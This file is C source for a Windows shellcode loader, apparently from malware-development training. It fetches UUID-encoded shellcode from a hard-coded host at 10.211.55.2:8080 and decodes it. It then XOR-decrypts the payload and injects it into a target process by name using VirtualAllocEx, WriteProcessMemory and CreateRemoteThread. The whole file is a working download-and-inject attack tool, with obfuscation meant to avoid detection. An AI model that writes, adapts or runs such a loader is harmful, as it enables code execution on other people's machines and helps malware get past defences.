#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#include "Struct.h"

#pragma comment(lib, "wininet.lib")

#define NumberOfElements 17
#define PAYLOAD L"http://10.211.55.2:8080/shellcodeuuid.txt"

typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
	);


typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
	RPC_CSTR        StringUuid,
	UUID* Uuid
	);

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE           pBuffer = NULL,
		TmpBuffer = NULL;

	SIZE_T          sBuffSize = NULL;

	PCSTR           Terminator = NULL;

	NTSTATUS        STATUS = NULL;

	// Getting the UuidFromStringA function's base address from Rpcrt4.dll
	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// Getting the size of the shellcode (number of elements * 16)
	sBuffSize = NmbrOfElements * 16;
	// Allocating memory that will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	// Setting TmpBuffer to be equal to pBuffer
	TmpBuffer = pBuffer;


	// Loop through all the addresses saved in UuidArray
	for (int i = 0; i < NmbrOfElements; i++) {
		// UuidArray[i] is a single UUid address from the array UuidArray
		if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
			// Failed
			printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);
			return FALSE;
		}

		// 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}

	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;
	return TRUE;
}

// change the random bytes
unsigned char randomKey[] = {
0xAA, 0xBB, 0xCC, 0xDD, 0xEE
};

VOID XorFunction(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j > sKeySize) {
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}

BOOL GetUUIDFromUrl(LPCWSTR szUrl, CHAR* UUID[]) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hUrl = NULL;

	// Read and store the UUIDs from the URL without null terminators
	char buffer[36]; // Assuming each UUID has 36 characters without a null terminator
	DWORD bytesRead;

	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
	hInternet = InternetOpenW(L"MalDevEin", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Opening the handle to the payload using the payload's URL
	hUrl = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
	if (hUrl == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	for (int i = 0; i < NumberOfElements; i++) {
		if (!InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			InternetCloseHandle(hUrl);
			InternetCloseHandle(hInternet);
			return -1;
		}
		// Allocate memory for the UUID and copy the buffer
		UUID[i] = (char*)malloc(bytesRead);
		if (UUID[i] == NULL) {
			perror("Error allocating memory");
			InternetCloseHandle(hUrl);
			InternetCloseHandle(hInternet);
			return -1;
		}
		memcpy(UUID[i], buffer, bytesRead);
	}


_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);									// Closing handle 
	if (hUrl)
		InternetCloseHandle(hUrl);										// Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
	return bSTATE;
}


BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess) {

	fnNtQuerySystemInformation		pNtQuerySystemInformation = NULL;
	ULONG							uReturnLen1 = NULL,
		uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = NULL;

	// getting NtQuerySystemInformation address
	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
	if (pNtQuerySystemInformation == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	// First NtQuerySystemInformation call
	// This will fail with STATUS_INFO_LENGTH_MISMATCH
	// But it will provide information about how much memory to allocate (uReturnLen1)
	pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	// allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	// since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later
	pValueToFree = SystemProcInfo;

	// Second NtQuerySystemInformation call
	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
		printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	while (TRUE) {

		// wprintf(L"[i] Process \"%s\" - Of Pid : %d \n", SystemProcInfo->ImageName.Buffer, SystemProcInfo->UniqueProcessId);

		// Check the process's name size
		// Comparing the enumerated process name to the intended target process
		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
			// openning a handle to the target process and saving it, then breaking 
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		// if NextEntryOffset is 0, we reached the end of the array
		if (!SystemProcInfo->NextEntryOffset)
			break;

		// moving to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	// Free the initial address
	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// Check if we successfully got the target process handle
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}


/*
API functions used to perform the code injection part:
- VirtualAllocEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex

- WriteProcessMemory: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

- VirtualProtectEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex

- CreateRemoteThread: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
*/


BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

	PVOID	pShellcodeAddress = NULL;

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;

	// Allocating memory in "hProcess" process of size "sSizeOfShellcode" and memory permissions set to read and write
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	// Writing the shellcode, pShellcode, to the allocated memory, pShellcodeAddress
	printf("[#] Press <Enter> To Write Payload ... ");
	getchar();
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	// Cleaning the buffer of the shellcode in the local process
	memset(pShellcode, '\0', sSizeOfShellcode);

	// Setting memory permossions at pShellcodeAddress to be executable 
	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Running the shellcode as a new thread's entry in the remote process
	printf("[#] Press <Enter> To Run ... ");
	getchar();
	printf("[i] Executing Payload ... ");
	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[+] DONE !\n");

	VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);

	return TRUE;
}


int wmain(int argc, wchar_t* argv[]) {

	DWORD		Pid = NULL;
	HANDLE		hProcess = NULL;

	PBYTE		pDeobfuscatedPayload = NULL;
	SIZE_T      sDeobfuscatedSize = NULL;

	char* UuidArray[NumberOfElements];

	// Checking command line arguments
	if (argc < 2) {
		wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
		return -1;
	}

	// Getting a handle to the process
	wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[1]);
	if (!GetRemoteProcessHandle(argv[1], &Pid, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}

	wprintf(L"[+] DONE \n");
	wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", argv[1], Pid);

	printf("[#] Press <Enter> To Read Payload from URL ... ");
	getchar();

	// Reading the payload 
	if (!GetUUIDFromUrl(PAYLOAD, &UuidArray)) {
		return -1;
	}

	// Now UuidArray contains the UUIDs read from the web server

		// You can print them to verify
	for (int i = 0; i < NumberOfElements; i++) {
		printf("UuidArray[%d]: %s\n", i, UuidArray[i]);
	}

	printf("[#] Press <Enter> To Decrypt ... ");
	getchar();
	printf("[i] Decrypting ...");
	if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
		return -1;
	}
	printf("[+] DONE !\n");
	printf("[i] Deobfuscated Payload At : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

	printf("[#] Press <Enter> To XOR Decrypt ... ");
	getchar();

	printf("[i] Decrypting ...");
	XorFunction(pDeobfuscatedPayload, sDeobfuscatedSize, randomKey, sizeof(randomKey));
	printf("[+] DONE !\n");

	printf("[i] Bytes : 0x%p \n", pDeobfuscatedPayload);
	printf("[i] Size  : %ld \n", sDeobfuscatedSize);

	printf("[#] Press <Enter> To Inject Shellcode to Target Process ... ");
	getchar();
	printf("[i] Injecting ...");

	// Injecting the shellcode
	if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {
		return -1;
	}

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	// Don't forget to free the memory when done
	for (int i = 0; i < 17; i++) {
		free(UuidArray[i]);
	}

	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
	CloseHandle(hProcess);

	return 0;
}
